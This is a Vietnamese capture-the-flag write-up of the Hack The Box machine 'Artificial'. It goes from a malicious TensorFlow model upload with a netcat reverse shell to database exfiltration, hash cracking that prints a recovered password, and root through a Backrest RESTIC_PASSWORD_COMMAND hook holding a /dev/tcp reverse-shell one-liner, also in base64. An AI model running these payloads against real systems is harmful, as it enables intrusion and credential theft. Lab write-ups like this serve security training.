![image](https://hackmd.io/_uploads/Hy7G79sExl.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/668)

## Comment
Leo root có nhiều cách khác nhau (cu em bảo thế :)) )

# Recon
## nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.11.74 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 07:12 EDT
Nmap scan report for 10.10.11.74
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.11.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 07:13 EDT
Nmap scan report for 10.10.11.74
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.86 seconds
```
Add domain vào `/etc/hosts`
```
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

# User flag
## TensorFlow Vuln 

![image](https://hackmd.io/_uploads/Hyx6ScoNlx.png)

Tải file `requirements.txt` và `dockerfile`, không rõ lý do mà không dùng được `requirements.txt` nên chuyển qua docker. Tuy nhiên thì cũng biết nó đang sử dụng `TensorFlow`

![image](https://hackmd.io/_uploads/BJZhP5oVxg.png)

> TensorFlow là một thư viện mã nguồn mở do Google phát triển, dùng để xây dựng và huấn luyện Machine Learning và Deep Learning

Search gg thấy nó có lỗ hổng có thể RCE [Link](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)

### Deploy docker
```
┌──(myenv)─(kali㉿kali)-[~/Downloads]
└─$ sudo apt install docker.io

┌──(myenv)─(kali㉿kali)-[~/Downloads]
└─$ sudo docker build -t tf38-cpu . 

┌──(myenv)─(kali㉿kali)-[~/Downloads]
└─$ sudo docker run -it tf38-cpu

root@dc5409888fe2:/code# python3 --version
Python 3.8.20
```

### Deploy PoC
Sau khi deploy thành công bắt đầu đưa PoC vào file để lấy payload gen file
```
┌──(kali㉿kali)-[~]
└─$ sudo docker cp /home/kali/exploit.py dc5409888fe2:/code
Successfully copied 2.05kB to dc5409888fe2:/code
```

Tại docker, chạy file và lấy được file `exploit.h5`
```
root@dc5409888fe2:/code# python3 exploit.py 
2025-06-25 11:50:18.474275: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
sh: 1: nc: not found
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
root@dc5409888fe2:/code# ls
exploit.h5  exploit.py  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

┌──(kali㉿kali)-[~]
└─$ sudo docker cp dc5409888fe2:/code/exploit.h5 .
Successfully copied 11.8kB to /home/kali/.
```

Upload file lên server và RCE thành công
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.146] from (UNKNOWN) [10.10.11.74] 49742
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
app@artificial:~/app$ ls /home
ls /home
app  gael
```

## Lateral Movement
User flag nằm ở user `gael`, ta cũng thấy được db của app
```
app@artificial:~/app$ cd instance
cd instance
app@artificial:~/app/instance$ ls
ls
users.db
app@artificial:~/app/instance$ python3 -m http.server 9801
python3 -m http.server 9801
Serving HTTP on 0.0.0.0 port 9801 (http://0.0.0.0:9801/) ...
```
### sqlite
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.11.74:9801/users.db -o users.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 24576  100 24576    0     0  33691      0 --:--:-- --:--:-- --:--:-- 33665
                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sqlite3 users.db                                 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
...
```

### CrackStation
Credential `gael:mattp005numbertwo`

![image](https://hackmd.io/_uploads/H1klo9iEgl.png)

```
┌──(kali㉿kali)-[~]
└─$ ssh gael@10.10.11.74 
...
Last login: Wed Jun 25 11:36:27 2025 from 10.10.14.146
gael@artificial:~$ ls
user.txt
```
Done
:::spoiler User flag
```
gael@artificial:~$ cat user.txt 
4f43d6f5ac2842b50d8b*****
```
:::

# Root flag
## Backup folder found
```
gael@artificial:/var/backups$ ls -al
total 51228
drwxr-xr-x  2 root root       4096 Jun  9 09:03 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      39386 Jun  9 09:02 apt.extended_states.0
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.1.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.2.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.3.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4356 Sep 22  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz

gael@artificial:~$ python3 -m http.server 9802
Serving HTTP on 0.0.0.0 port 9802 (http://0.0.0.0:9802/) ...
10.10.14.146 - - [25/Jun/2025 11:39:59] code 404, message File not found
10.10.14.146 - - [25/Jun/2025 11:39:59] "GET /backrest_backup.tar.gz HTTP/1.1" 404 -
Read from remote host 10.10.11.74: Connection reset by peer
Connection to 10.10.11.74 closed.
client_loop: send disconnect: Broken pipe
```

Tại file `/backrest/.config/backrest` ta có credential được encrypt bcrypt của user `backrest_root`
```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

## John the Ripper
Chuyển từ bcrypt sang base64 trước
```
┌──(kali㉿kali)-[~]
└─$ cat hash.txt| base64 -d                                   
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```
Giờ thì chạy john
```
┌──(kali㉿kali)-[~]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt   
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#***         (?)     
1g 0:00:00:15 DONE (2025-06-23 05:01) 0.06544g/s 353.4p/s 353.4c/s 353.4C/s lightbulb..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Sau đó ssh luôn thì không được nên phải dùng credential này cho việc khác

## SSH Local Port Forwarding
:::info
SSH Local Port Forwarding được sử dụng để chuyển tiếp 1 port từ máy local đến máy server (hoặc ngược lại) bằng cách sử dụng giao thức SSH để vận chuyển

Người dùng có thể sử dụng Local Port Forwarding để:
- Kết nối với dịch vụ trong mạng nội bộ từ bên ngoài.
- Sử dụng để chuyển file qua internet.
- Tạo phiên và chuyển tập tin qua Jump Server
:::
Kiểm tra các port và thấy port `5000` và `9898` đang chạy local
> Port 5000 thường là ứng dụng Flask nên ta chưa cần quan tâm lắm nên sẽ qua port 9898 trước
```
gael@artificial:~$ ss -tuln
Netid         State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port         Process         
udp           UNCONN         0              0                      127.0.0.53%lo:53                        0.0.0.0:*                            
tcp           LISTEN         0              2048                       127.0.0.1:5000                      0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:9898                      0.0.0.0:*                            
tcp           LISTEN         0              511                          0.0.0.0:80                        0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:22                        0.0.0.0:*                            
tcp           LISTEN         0              511                             [::]:80                           [::]:*                            
tcp           LISTEN         0              128                             [::]:22     
```
Tiếp theo sẽ tạo Local Port Forwarding đến server
```
┌──(kali㉿kali)-[~]
└─$ ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
gael@10.10.11.74's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...
gael@artificial:~$ 
```
Đăng nhập --> dashboard

![image](https://hackmd.io/_uploads/BkmvJjo4ge.png)

## Root shell
Tạo reverseshell 
```
┌──(kali㉿kali)-[~]
└─$ echo "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1" | base64

RESTIC_PASSWORD_COMMAND=echo
"YmFzaCAtaSA+JiAvZGVzxL3RjcC8xMC4xMC4xNi4xMzUvNDQ0NCAwPiYxCg==" | base64 -d | bash

# this added in hooks
RESTIC_PASSWORD_COMMAND=bash -c ' bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
```

![image](https://hackmd.io/_uploads/r18NhJn4ll.png)

Done 
:::spoiler Root flag
```
root@artificial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@artificial:~# cat root.txt
a84c0de1c2*******
```
:::

------------------------------------------ Artificial has been Pwned! ------------------------------------------

![image](https://hackmd.io/_uploads/B1rnCk34el.png)
